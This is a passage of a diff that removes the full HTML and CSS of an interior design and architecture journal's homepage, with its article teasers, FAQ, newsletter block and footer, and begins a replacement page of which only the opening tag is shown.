@@ -1,1188 +1,379 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Abstract Built Matter · Interior Design & Architecture Journal</title>
-  <meta name="description" content="In-depth essays, practical guides, and critical perspectives on interior design, architecture, materials, and the built environment.">
-  <!-- Open Graph -->
-  <meta property="og:title" content="Abstract Built Matter · Interior Design & Architecture Journal">
-  <meta property="og:description" content="Independent editorial on spaces, materials, and the art of living well.">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=1200&h=630&fit=crop">
-  <meta property="og:url" content="https://abstractbuiltmatter.com">
-  <link rel="canonical" href="https://abstractbuiltmatter.com">
-  <!-- Fonts + Icons -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=Inter:opsz,wght@14..32,300..700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-    :root {
-      --ink: #1a1a1a;
-      --paper: #f9f8f6;
-      --paper-alt: #f1efec;
-      --line: #ddd9d2;
-      --line-dark: #c2bbb2;
-      --accent: #9b7b5e;
-      --accent-deep: #6f5640;
-      --serif: 'DM Serif Display', Georgia, serif;
-      --sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      --max-width: 1380px;
-      --content-width: 820px;
-    }
-
-    body {
-      background: var(--paper);
-      color: var(--ink);
-      font-family: var(--sans);
-      font-weight: 350;
-      line-height: 1.7;
-      font-size: 16px;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    /* ----- TYPOGRAPHY ----- */
-    h1, h2, h3, h4 {
-      font-family: var(--serif);
-      font-weight: 400;
-      line-height: 1.2;
-      letter-spacing: -0.02em;
-    }
-
-    h1 { font-size: 3.2rem; }
-    h2 { font-size: 2.2rem; margin-bottom: 1.2rem; }
-    h3 { font-size: 1.5rem; margin-bottom: 0.75rem; }
-    h4 { font-size: 1.15rem; font-family: var(--sans); font-weight: 600; letter-spacing: -0.01em; }
-
-    a {
-      color: var(--ink);
-      text-decoration: none;
-      transition: color 0.15s;
-    }
-
-    a:hover {
-      color: var(--accent-deep);
-    }
-
-    img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-    }
-
-    /* ----- LAYOUT ----- */
-    .container {
-      max-width: var(--max-width);
-      margin: 0 auto;
-      padding: 0 28px;
-    }
-
-    .content-grid {
-      display: grid;
-      grid-template-columns: 1fr 340px;
-      gap: 60px;
-      align-items: start;
-    }
-
-    /* ----- HEADER ----- */
-    .blog-header {
-      border-bottom: 1px solid var(--line);
-      padding: 24px 0 16px;
-      background: var(--paper);
-      position: relative;
-      z-index: 10;
-    }
-
-    .header-inner {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 24px;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .logo-mark {
-      width: 44px;
-      height: 44px;
-      background: var(--ink);
-      color: var(--paper);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: var(--serif);
-      font-size: 1.8rem;
-      line-height: 1;
-      border-radius: 2px;
-      transform: rotate(-2deg);
-    }
-
-    .logo-text {
-      font-family: var(--serif);
-      font-size: 1.6rem;
-      letter-spacing: -0.03em;
-      line-height: 1.1;
-    }
-
-    .logo-text span {
-      display: block;
-      font-family: var(--sans);
-      font-size: 0.65rem;
-      font-weight: 500;
-      letter-spacing: 0.18em;
-      text-transform: uppercase;
-      color: var(--accent);
-      margin-top: 2px;
-    }
-
-    .main-nav ul {
-      display: flex;
-      gap: 32px;
-      list-style: none;
-      font-size: 0.9rem;
-      font-weight: 450;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-
-    .main-nav a {
-      color: #3d3d3d;
-      font-size: 0.82rem;
-    }
-
-    .main-nav a:hover {
-      color: var(--accent-deep);
-    }
-
-    .search-trigger {
-      background: none;
-      border: 1px solid var(--line);
-      border-radius: 40px;
-      padding: 8px 18px;
-      font-size: 0.85rem;
-      font-family: var(--sans);
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      color: #4a4a4a;
-      transition: all 0.2s;
-    }
-
-    .search-trigger:hover {
-      background: var(--paper-alt);
-      border-color: var(--line-dark);
-    }
-
-    /* ----- SEARCH BAR (hidden until triggered) ----- */
-    .search-panel {
-      display: none;
-      padding: 16px 0 24px;
-      border-bottom: 1px solid var(--line);
-      background: var(--paper);
-    }
-
-    .search-panel.active {
-      display: block;
-    }
-
-    .search-inner {
-      display: flex;
-      gap: 12px;
-    }
-
-    .search-inner input {
-      flex: 1;
-      padding: 14px 18px;
-      border: 1px solid var(--line);
-      background: white;
-      font-family: var(--sans);
-      font-size: 1rem;
-      border-radius: 2px;
-    }
-
-    .search-inner input:focus {
-      outline: none;
-      border-color: var(--accent);
-    }
-
-    .search-inner button {
-      padding: 0 28px;
-      background: var(--ink);
-      color: white;
-      border: none;
-      font-family: var(--sans);
-      font-weight: 500;
-      letter-spacing: 0.03em;
-      cursor: pointer;
-      border-radius: 2px;
-      transition: background 0.2s;
-    }
-
-    .search-inner button:hover {
-      background: var(--accent-deep);
-    }
-
-    /* ----- CATEGORY FILTER STRIP ----- */
-    .category-strip {
-      padding: 28px 0 32px;
-      border-bottom: 1px solid var(--line);
-      overflow-x: auto;
-      white-space: nowrap;
-      scrollbar-width: none;
-    }
-
-    .category-strip::-webkit-scrollbar {
-      display: none;
-    }
-
-    .category-list {
-      display: flex;
-      gap: 12px;
-      list-style: none;
-    }
-
-    .category-list button {
-      background: transparent;
-      border: 1px solid var(--line);
-      padding: 8px 20px;
-      font-family: var(--sans);
-      font-size: 0.85rem;
-      font-weight: 450;
-      letter-spacing: 0.02em;
-      color: #3e3e3e;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: all 0.15s;
-      white-space: nowrap;
-    }
-
-    .category-list button:hover,
-    .category-list button.active {
-      background: var(--ink);
-      color: var(--paper);
-      border-color: var(--ink);
-    }
-
-    /* ----- MAIN CONTENT ----- */
-    .main-content {
-      padding: 48px 0 64px;
-    }
-
-    .featured-article {
-      margin-bottom: 60px;
-      border-bottom: 1px solid var(--line);
-      padding-bottom: 48px;
-    }
-
-    .featured-article .category-tag {
-      display: inline-block;
-      font-size: 0.7rem;
-      font-weight: 600;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      color: var(--accent-deep);
-      margin-bottom: 14px;
-      border-bottom: 1px solid var(--accent);
-      padding-bottom: 4px;
-    }
-
-    .featured-article h1 {
-      font-size: 3rem;
-      margin-bottom: 20px;
-      line-height: 1.15;
-    }
-
-    .featured-meta {
-      display: flex;
-      gap: 24px;
-      font-size: 0.85rem;
-      color: #6b6b6b;
-      margin-bottom: 24px;
-      flex-wrap: wrap;
-    }
-
-    .featured-image {
-      margin: 32px 0 28px;
-      border-radius: 4px;
-      overflow: hidden;
-      background: var(--paper-alt);
-    }
-
-    .featured-image img {
-      width: 100%;
-      height: auto;
-      max-height: 520px;
-      object-fit: cover;
-    }
-
-    .featured-excerpt {
-      font-size: 1.15rem;
-      color: #2e2e2e;
-      margin-bottom: 24px;
-    }
-
-    .read-more {
-      font-weight: 500;
-      font-size: 0.9rem;
-      letter-spacing: 0.03em;
-      border-bottom: 1px solid var(--ink);
-      padding-bottom: 3px;
-      display: inline-block;
-    }
-
-    /* ----- ARTICLE CARDS ----- */
-    .article-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 40px 40px;
-      margin-bottom: 56px;
-    }
-
-    .article-card {
-      border-bottom: 1px solid var(--line);
-      padding-bottom: 28px;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .article-card .card-category {
-      font-size: 0.68rem;
-      font-weight: 600;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      color: var(--accent-deep);
-      margin-bottom: 10px;
-    }
-
-    .article-card h3 {
-      font-size: 1.4rem;
-      margin-bottom: 12px;
-      line-height: 1.3;
-    }
-
-    .article-card h3 a:hover {
-      color: var(--accent-deep);
-    }
-
-    .article-card .card-meta {
-      font-size: 0.78rem;
-      color: #777;
-      margin-bottom: 12px;
-      display: flex;
-      gap: 16px;
-    }
-
-    .article-card p {
-      font-size: 0.95rem;
-      color: #3e3e3e;
-      margin-bottom: 16px;
-      flex: 1;
-    }
-
-    .article-card .card-link {
-      font-size: 0.8rem;
-      font-weight: 500;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-      color: var(--accent-deep);
-      align-self: flex-start;
-      border-bottom: 1px solid transparent;
-    }
-
-    .article-card .card-link:hover {
-      border-bottom-color: var(--accent-deep);
-    }
-
-    /* ----- SIDEBAR ----- */
-    .sidebar {
-      position: sticky;
-      top: 24px;
-    }
-
-    .sidebar-widget {
-      margin-bottom: 44px;
-      padding-bottom: 36px;
-      border-bottom: 1px solid var(--line);
-    }
-
-    .sidebar-widget:last-child {
-      border-bottom: none;
-    }
-
-    .sidebar-widget h4 {
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.12em;
-      font-weight: 600;
-      margin-bottom: 20px;
-      color: #4b4b4b;
-    }
-
-    .sidebar-widget ul {
-      list-style: none;
-    }
-
-    .sidebar-widget li {
-      margin-bottom: 14px;
-      font-size: 0.9rem;
-      line-height: 1.5;
-    }
-
-    .sidebar-widget li a {
-      display: flex;
-      justify-content: space-between;
-      border-bottom: 1px dotted var(--line);
-      padding-bottom: 8px;
-    }
-
-    .sidebar-widget .widget-article {
-      display: flex;
-      gap: 14px;
-      margin-bottom: 18px;
-      align-items: flex-start;
-    }
-
-    .widget-article .num {
-      font-family: var(--serif);
-      font-size: 1.4rem;
-      color: var(--accent);
-      line-height: 1;
-      min-width: 24px;
-    }
-
-    .widget-article .info h5 {
-      font-size: 0.92rem;
-      font-weight: 550;
-      margin-bottom: 4px;
-      line-height: 1.35;
-    }
-
-    .widget-article .info span {
-      font-size: 0.72rem;
-      color: #888;
-    }
-
-    /* ----- ABOUT / EDITOR SECTION ----- */
-    .editor-note {
-      background: var(--paper-alt);
-      padding: 36px 32px;
-      border-radius: 4px;
-      margin-top: 20px;
-    }
-
-    .editor-note p {
-      font-size: 0.92rem;
-      font-style: italic;
-      color: #3d3d3d;
-    }
-
-    .editor-note .editor-name {
-      font-style: normal;
-      font-weight: 600;
-      margin-top: 14px;
-      font-size: 0.85rem;
-      letter-spacing: 0.02em;
-    }
-
-    /* ----- FAQ SECTION ----- */
-    .faq-section {
-      margin: 56px 0 40px;
-      padding: 40px 0;
-      border-top: 1px solid var(--line);
-      border-bottom: 1px solid var(--line);
-    }
-
-    .faq-section h2 {
-      font-size: 1.8rem;
-      margin-bottom: 32px;
-    }
-
-    .faq-item {
-      border-bottom: 1px solid var(--line);
-      padding: 16px 0;
-    }
-
-    .faq-question {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      cursor: pointer;
-      font-weight: 550;
-      font-size: 1.05rem;
-      gap: 16px;
-    }
-
-    .faq-question i {
-      font-size: 0.8rem;
-      color: var(--accent);
-      transition: transform 0.2s;
-    }
-
-    .faq-answer {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.35s ease;
-      font-size: 0.95rem;
-      color: #3e3e3e;
-      padding-right: 24px;
-    }
-
-    .faq-answer p {
-      padding-top: 16px;
-    }
-
-    .faq-item.open .faq-answer {
-      max-height: 300px;
-    }
-
-    .faq-item.open .faq-question i {
-      transform: rotate(180deg);
-    }
-
-    /* ----- NEWSLETTER ----- */
-    .newsletter-block {
-      background: var(--ink);
-      color: var(--paper);
-      padding: 48px 40px;
-      border-radius: 6px;
-      margin: 48px 0 32px;
-    }
-
-    .newsletter-block h3 {
-      color: var(--paper);
-      font-size: 1.8rem;
-      margin-bottom: 8px;
-    }
-
-    .newsletter-block p {
-      color: #b9b2a8;
-      margin-bottom: 24px;
-      font-size: 0.95rem;
-    }
-
-    .newsletter-form {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-
-    .newsletter-form input {
-      flex: 1;
-      min-width: 240px;
-      padding: 14px 18px;
-      border: none;
-      border-radius: 2px;
-      font-family: var(--sans);
-      font-size: 0.95rem;
-      background: #2b2b2b;
-      color: white;
-    }
-
-    .newsletter-form input::placeholder {
-      color: #8a837b;
-    }
-
-    .newsletter-form button {
-      padding: 14px 32px;
-      background: var(--accent);
-      color: var(--ink);
-      border: none;
-      font-weight: 600;
-      font-family: var(--sans);
-      letter-spacing: 0.03em;
-      cursor: pointer;
-      border-radius: 2px;
-      transition: background 0.2s;
-    }
-
-    .newsletter-form button:hover {
-      background: #b18f6f;
-    }
-
-    /* ----- FOOTER ----- */
-    .editorial-footer {
-      border-top: 1px solid var(--line);
-      padding: 56px 0 32px;
-      background: var(--paper-alt);
-      margin-top: 40px;
-    }
-
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr 1fr 1fr;
-      gap: 48px;
-      margin-bottom: 48px;
-    }
-
-    .footer-brand p {
-      font-size: 0.88rem;
-      color: #4d4d4d;
-      max-width: 280px;
-      margin-top: 12px;
-    }
-
-    .footer-col h5 {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.12em;
-      font-weight: 600;
-      margin-bottom: 20px;
-      color: #5a5a5a;
-    }
-
-    .footer-col ul {
-      list-style: none;
-    }
-
-    .footer-col li {
-      margin-bottom: 10px;
-    }
-
-    .footer-col a {
-      font-size: 0.88rem;
-      color: #3d3d3d;
-    }
-
-    .footer-bottom {
-      border-top: 1px solid var(--line);
-      padding-top: 24px;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 20px;
-      font-size: 0.78rem;
-      color: #777;
-    }
-
-    .footer-bottom a {
-      color: #555;
-      margin-left: 20px;
-    }
-
-    /* ----- RESPONSIVE ----- */
-    @media (max-width: 1024px) {
-      .content-grid {
-        grid-template-columns: 1fr;
-        gap: 48px;
-      }
-      .sidebar {
-        position: static;
-      }
-      .article-grid {
-        grid-template-columns: 1fr 1fr;
-      }
-      .footer-grid {
-        grid-template-columns: 1fr 1fr;
-      }
-      h1 { font-size: 2.6rem; }
-    }
-
-    @media (max-width: 700px) {
-      .header-inner {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      .main-nav ul {
-        flex-wrap: wrap;
-        gap: 16px 24px;
-      }
-      .article-grid {
-        grid-template-columns: 1fr;
-      }
-      .footer-grid {
-        grid-template-columns: 1fr;
-        gap: 32px;
-      }
-      h1 { font-size: 2rem; }
-      .featured-article h1 { font-size: 2rem; }
-      .container { padding: 0 20px; }
-      .newsletter-block { padding: 32px 24px; }
-      .search-inner { flex-direction: column; }
-      .search-inner button { padding: 14px; }
-    }
-
-    /* utility */
-    .hidden { display: none; }
-    .sr-only {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      padding: 0;
-      margin: -1px;
-      overflow: hidden;
-    }
-    .mt-2 { margin-top: 8px; }
-    .mb-2 { margin-bottom: 8px; }
-  </style>
-</head>
-<body>
-
-<!-- ========== HEADER ========== -->
-<header class="blog-header">
-  <div class="container">
-    <div class="header-inner">
-      <div class="logo">
-        <div class="logo-mark">A</div>
-        <div class="logo-text">Abstract Built Matter<span>Interior · Architecture</span></div>
-      </div>
-      <nav class="main-nav" aria-label="Main navigation">
-        <ul>
-        <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li> 
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="categories.html">Categories</a></li>
-        </ul>
-      </nav>
-      <button class="search-trigger" id="searchToggle" aria-label="Open search">
-        <i class="fas fa-search"></i> Search
-      </button>
-    </div>
-  </div>
-  <!-- search panel -->
-  <div class="search-panel" id="searchPanel">
-    <div class="container">
-      <div class="search-inner">
-        <input type="text" id="searchInput" placeholder="Search articles, topics, or keywords..." aria-label="Search articles">
-        <button id="searchButton">Search</button>
-      </div>
-    </div>
-  </div>
-</header>
-
-<!-- ========== CATEGORY FILTER STRIP ========== -->
-<div class="category-strip">
-  <div class="container">
-    <ul class="category-list" id="categoryList">
-      <li><button data-category="all" class="active">All</button></li>
-      <li><button data-category="interior-design">Interior Design</button></li>
-      <li><button data-category="architecture">Architecture</button></li>
-      <li><button data-category="home-design">Home Design</button></li>
-      <li><button data-category="materials">Materials</button></li>
-      <li><button data-category="space-planning">Space Planning</button></li>
-      <li><button data-category="lighting">Lighting</button></li>
-      <li><button data-category="furniture">Furniture</button></li>
-      <li><button data-category="modern-homes">Modern Homes</button></li>
-    </ul>
-  </div>
-</div>
-
-<!-- ========== MAIN CONTENT ========== -->
-<main class="container main-content">
-  <div class="content-grid">
-    <!-- LEFT / MAIN COLUMN -->
-    <div class="primary-column">
-
-      <!-- FEATURED ARTICLE -->
-      <article class="featured-article" data-category="interior-design">
-        <span class="category-tag">Interior Design · Featured</span>
-        <h1><a href="#">The Quiet Power of Material Honesty in Modern Interiors</a></h1>
-        <div class="featured-meta">
-          <span><i class="far fa-calendar-alt"></i> March 12, 2025</span>
-          <span><i class="far fa-clock"></i> 12 min read</span>
-          <span><i class="far fa-user"></i> By Lena Ortiz</span>
-        </div>
-        <div class="featured-image">
-          <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=1200&h=600&fit=crop" alt="Warm minimalist living room with exposed concrete walls, oak flooring, and linen sofa" loading="lazy">
-        </div>
-        <p class="featured-excerpt">
-          In an era of synthetic finishes and digital distraction, the most radical move an interior designer can make is to let materials speak for themselves. We explore why raw timber, unpolished stone, and honest joinery are redefining the contemporary home — and how to use them without falling into cliché.
-        </p>
-        <a href="#" class="read-more">Continue reading <i class="fas fa-arrow-right" style="font-size:0.8rem; margin-left:4px;"></i></a>
-      </article>
-
-      <!-- ARTICLE GRID - 4 cards -->
-      <div class="article-grid" id="articleGrid">
-        <article class="article-card" data-category="architecture">
-          <div class="card-category">Architecture</div>
-          <h3><a href="#">The Courtyard Returns: Ancient Wisdom for Climate-Responsive Homes</a></h3>
-          <div class="card-meta"><span>8 min read</span><span>Mar 10, 2025</span></div>
-          <p>From Marrakech to Mexico City, the courtyard house is being reimagined as a passive cooling strategy and a sanctuary for privacy. Here's how contemporary architects are adapting a 2,000-year-old idea.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-
-        <article class="article-card" data-category="lighting">
-          <div class="card-category">Lighting</div>
-          <h3><a href="#">Layered Lighting: The Difference Between a House and a Home</a></h3>
-          <div class="card-meta"><span>10 min read</span><span>Mar 8, 2025</span></div>
-          <p>Overhead lights alone create flat, institutional spaces. We break down the four layers of lighting — ambient, task, accent, and decorative — with practical placement diagrams.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-
-        <article class="article-card" data-category="materials">
-          <div class="card-category">Materials</div>
-          <h3><a href="#">Lime Plaster vs. Gypsum: A Practical Guide to Wall Finishes</a></h3>
-          <div class="card-meta"><span>9 min read</span><span>Mar 5, 2025</span></div>
-          <p>Breathability, durability, cost, and aesthetics — we compare two of the most common interior wall finishes and explain when to specify each one.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-
-        <article class="article-card" data-category="space-planning">
-          <div class="card-category">Space Planning</div>
-          <h3><a href="#">The 3-Second Rule: Circulation Paths That Actually Work</a></h3>
-          <div class="card-meta"><span>7 min read</span><span>Mar 2, 2025</span></div>
-          <p>Bad circulation makes a home feel cramped even when it's spacious. Learn how to map movement, avoid pinch points, and design for the way people really live.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-      </div>
-
-      <!-- LONG-FORM ARTICLE SECTION (rich content) -->
-      <article class="featured-article" data-category="architecture" style="border-top:1px solid var(--line); padding-top:48px;">
-        <span class="category-tag">Architecture · Long Read</span>
-        <h2><a href="#">Concrete That Breathes: The New Wave of Sustainable Masonry</a></h2>
-        <div class="featured-meta">
-          <span><i class="far fa-calendar-alt"></i> February 28, 2025</span>
-          <span><i class="far fa-clock"></i> 18 min read</span>
-        </div>
-        <div class="featured-image">
-          <img src="https://images.unsplash.com/photo-1503387762-592deb58ef4e?w=1200&h=600&fit=crop" alt="Close-up of textured concrete wall with board-formed finish and soft daylight" loading="lazy">
-        </div>
-        <p>Concrete is responsible for roughly 8% of global CO₂ emissions. But a new generation of architects and material scientists is reinventing the world's most-used building material. From carbon-cured blocks to hempcrete and geopolymer alternatives, we examine the innovations that could decarbonize our foundations — and the aesthetic implications of building with less guilt.</p>
-        <p style="margin-top:16px;">We spoke with three practices across Europe and North America who are pushing the boundaries of low-carbon masonry. Their projects reveal a common thread: sustainability doesn't have to mean compromise. In fact, many of these materials offer richer textures, better thermal performance, and a patina that improves with age.</p>
-        <a href="#" class="read-more">Read the full analysis <i class="fas fa-arrow-right" style="font-size:0.8rem; margin-left:4px;"></i></a>
-      </article>
-
-      <!-- MORE ARTICLES (4 additional) -->
-      <div class="article-grid" style="margin-top:48px;">
-        <article class="article-card" data-category="furniture">
-          <div class="card-category">Furniture</div>
-          <h3><a href="#">Why Mid-Century Modern Refuses to Die (And What to Buy Instead)</a></h3>
-          <div class="card-meta"><span>11 min read</span><span>Feb 25, 2025</span></div>
-          <p>The market is saturated with knockoffs. We look at the original principles behind mid-century design — honest materials, human scale, and functional beauty — and suggest contemporary makers who carry the torch.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-
-        <article class="article-card" data-category="home-design">
-          <div class="card-category">Home Design</div>
-          <h3><a href="#">The Case for the Unfinished Room: Living with Imperfection</a></h3>
-          <div class="card-meta"><span>6 min read</span><span>Feb 22, 2025</span></div>
-          <p>Not every wall needs art. Not every shelf needs styling. We explore the Japanese concept of wabi-sabi and how leaving space unfinished can make a home feel more alive.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-
-        <article class="article-card" data-category="modern-homes">
-          <div class="card-category">Modern Homes</div>
-          <h3><a href="#">Glass Boxes Reconsidered: Privacy, Heat, and the All-Glass Facade</a></h3>
-          <div class="card-meta"><span>13 min read</span><span>Feb 18, 2025</span></div>
-          <p>Floor-to-ceiling glazing is a staple of contemporary architecture, but it comes with real trade-offs. We examine shading strategies, bird-safe glass, and when to break the box.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-
-        <article class="article-card" data-category="interior-design">
-          <div class="card-category">Interior Design</div>
-          <h3><a href="#">The Psychology of Color: Beyond the Accent Wall</a></h3>
-          <div class="card-meta"><span>9 min read</span><span>Feb 15, 2025</span></div>
-          <p>Color affects mood, perception of space, and even sleep quality. We go beyond the tired "blue is calming" advice and look at saturation, undertones, and cultural context.</p>
-          <a href="#" class="card-link">Read →</a>
-        </article>
-      </div>
-
-      <!-- NEW IMAGE + ARTICLE (original architecture image) -->
-      <article class="featured-article" data-category="architecture" style="margin-top:20px;">
-        <span class="category-tag">Architecture · Project Study</span>
-        <h2><a href="#">A Coastal Retreat in Raw Timber and Rammed Earth</a></h2>
-        <div class="featured-meta">
-          <span><i class="far fa-calendar-alt"></i> February 10, 2025</span>
-          <span><i class="far fa-clock"></i> 14 min read</span>
-        </div>
-        <div class="featured-image">
-          <img src="https://images.unsplash.com/photo-1580587771525-78b9dba3b914?w=1200&h=600&fit=crop" alt="Modern coastal house with rammed earth walls and large timber-framed windows overlooking the ocean" loading="lazy">
-        </div>
-        <p>Perched on a windswept cliff, this residence by Studio Meridian uses locally sourced rammed earth and reclaimed timber to create a home that feels both ancient and utterly contemporary. We explore the construction details, thermal mass strategies, and the poetic interplay of light and shadow.</p>
-        <a href="#" class="read-more">Read the project story <i class="fas fa-arrow-right" style="font-size:0.8rem; margin-left:4px;"></i></a>
-      </article>
-
-      <!-- ========== FAQ SECTION ========== -->
-      <section class="faq-section">
-        <h2>Frequently Asked Questions</h2>
-        <div class="faq-item">
-          <div class="faq-question">
-            <span>What is the difference between interior design and interior architecture?</span>
-            <i class="fas fa-chevron-down"></i>
-          </div>
-          <div class="faq-answer">
-            <p>Interior design focuses on finishes, furnishings, and the aesthetic and functional improvement of interior spaces. Interior architecture (sometimes called interior architecture and design) involves structural modifications — moving walls, altering ceiling heights, and designing built-in elements. Many practitioners work across both disciplines.</p>
-          </div>
-        </div>
-        <div class="faq-item">
-          <div class="faq-question">
-            <span>How do I choose the right lighting for a living room?</span>
-            <i class="fas fa-chevron-down"></i>
-          </div>
-          <div class="faq-answer">
-            <p>Start with ambient light (recessed or ceiling fixtures) for general illumination, then add task lighting (floor lamps, table lamps) for reading, and accent lighting (wall sconces, picture lights) for depth. Aim for a color temperature between 2700K and 3000K for a warm, inviting feel.</p>
-          </div>
-        </div>
-        <div class="faq-item">
-          <div class="faq-question">
-            <span>What are the most sustainable materials for home renovation?</span>
-            <i class="fas fa-chevron-down"></i>
-          </div>
-          <div class="faq-answer">
-            <p>Reclaimed wood, bamboo, cork, hempcrete, recycled steel, and low-carbon concrete are among the best choices. Also consider local sourcing to reduce transportation emissions and look for materials with third-party certifications like FSC or Cradle to Cradle.</p>
-          </div>
-        </div>
-        <div class="faq-item">
-          <div class="faq-question">
-            <span>How can I make a small space feel larger?</span>
-            <i class="fas fa-chevron-down"></i>
-          </div>
-          <div class="faq-answer">
-            <p>Use a consistent color palette, maximize natural light, choose furniture with legs (to show floor), use mirrors strategically, and avoid heavy visual clutter. Multi-functional furniture and vertical storage also help.</p>
-          </div>
-        </div>
-      </section>
-
-      <!-- ========== NEWSLETTER ========== -->
-      <div class="newsletter-block">
-        <h3>Stay inspired</h3>
-        <p>Get our weekly digest of new articles, project tours, and design thinking — no noise, just substance.</p>
-        <form class="newsletter-form" id="newsletterForm">
-          <input type="email" placeholder="Your email address" required aria-label="Email address">
-          <button type="submit">Subscribe</button>
-        </form>
-        <p style="font-size:0.78rem; margin-top:16px; color:#8a837b;">We respect your inbox. Unsubscribe anytime.</p>
-      </div>
-
-    </div>
-
-    <!-- ========== SIDEBAR ========== -->
-    <aside class="sidebar">
-      <div class="sidebar-widget">
-        <h4>About the Journal</h4>
-        <p style="font-size:0.92rem; color:#3d3d3d; margin-bottom:18px;">Abstract Built Matter is an independent publication exploring the intersection of design, materials, and the spaces we inhabit.</p>
-        <div class="editor-note">
-          <p>“We believe good design is a form of quiet activism — it shapes how we live, connect, and care for the planet.”</p>
-          <div class="editor-name">— Lena Ortiz, Editor-in-Chief</div>
-        </div>
-      </div>
-
-      <div class="sidebar-widget">
-        <h4>Popular This Week</h4>
-        <div class="widget-article">
-          <div class="num">01</div>
-          <div class="info">
-            <h5><a href="#">The 7 Most Common Interior Design Mistakes</a></h5>
-            <span>9 min read</span>
-          </div>
-        </div>
-        <div class="widget-article">
-          <div class="num">02</div>
-          <div class="info">
-            <h5><a href="#">How to Read a Floor Plan Like an Architect</a></h5>
-            <span>12 min read</span>
-          </div>
-        </div>
-        <div class="widget-article">
-          <div class="num">03</div>
-          <div class="info">
-            <h5><a href="#">Small Bathroom, Big Ideas: 8 Renovation Strategies</a></h5>
-            <span>7 min read</span>
-          </div>
-        </div>
-      </div>
-
-      <div class="sidebar-widget">
-        <h4>Categories</h4>
-        <ul>
-          <li><a href="#">Interior Design <span>24</span></a></li>
-          <li><a href="#">Architecture <span>18</span></a></li>
-          <li><a href="#">Materials <span>12</span></a></li>
-          <li><a href="#">Lighting <span>9</span></a></li>
-          <li><a href="#">Space Planning <span>7</span></a></li>
-          <li><a href="#">Furniture <span>11</span></a></li>
-        </ul>
-      </div>
-
-      <div class="sidebar-widget">
-        <h4>Editor's Pick</h4>
-        <div class="widget-article">
-          <div class="info">
-            <h5><a href="#">The Quiet Power of Material Honesty</a></h5>
-            <span>Featured · 12 min</span>
-          </div>
-        </div>
-      </div>
-    </aside>
-  </div>
-</main>
-
-<!-- ========== FOOTER ========== -->
-<footer class="editorial-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <div class="logo" style="margin-bottom:8px;">
-          <div class="logo-mark" style="background:var(--ink); color:var(--paper);">A</div>
-          <div class="logo-text" style="font-size:1.4rem;">Abstract Built Matter</div>
-        </div>
-        <p>An independent journal of interior design and architecture. Published since 2019.</p>
-      </div>
-      <div class="footer-col">
-        <h5>Explore</h5>
-        <ul>
-          <li><a href="#">Interior Design</a></li>
-          <li><a href="#">Architecture</a></li>
-          <li><a href="#">Materials</a></li>
-          <li><a href="#">Lighting</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h5>Information</h5>
-        <ul>
-          <li><a href="#">About</a></li>
-          <li><a href="#">Contact</a></li>
-          <li><a href="#">Privacy Policy</a></li>
-          <li><a href="#">Terms of Use</a></li>
-          <li><a href="#">Cookie Policy</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h5>Follow</h5>
-        <ul>
-          <li><a href="#">Instagram</a></li>
-          <li><a href="#">Pinterest</a></li>
-          <li><a href="#">Newsletter</a></li>
-        </ul>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <span>© 2025 Abstract Built Matter. All rights reserved.</span>
-      <div>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-        <a href="#">Cookies</a>
-      </div>
-    </div>
-  </div>
-</footer>
-
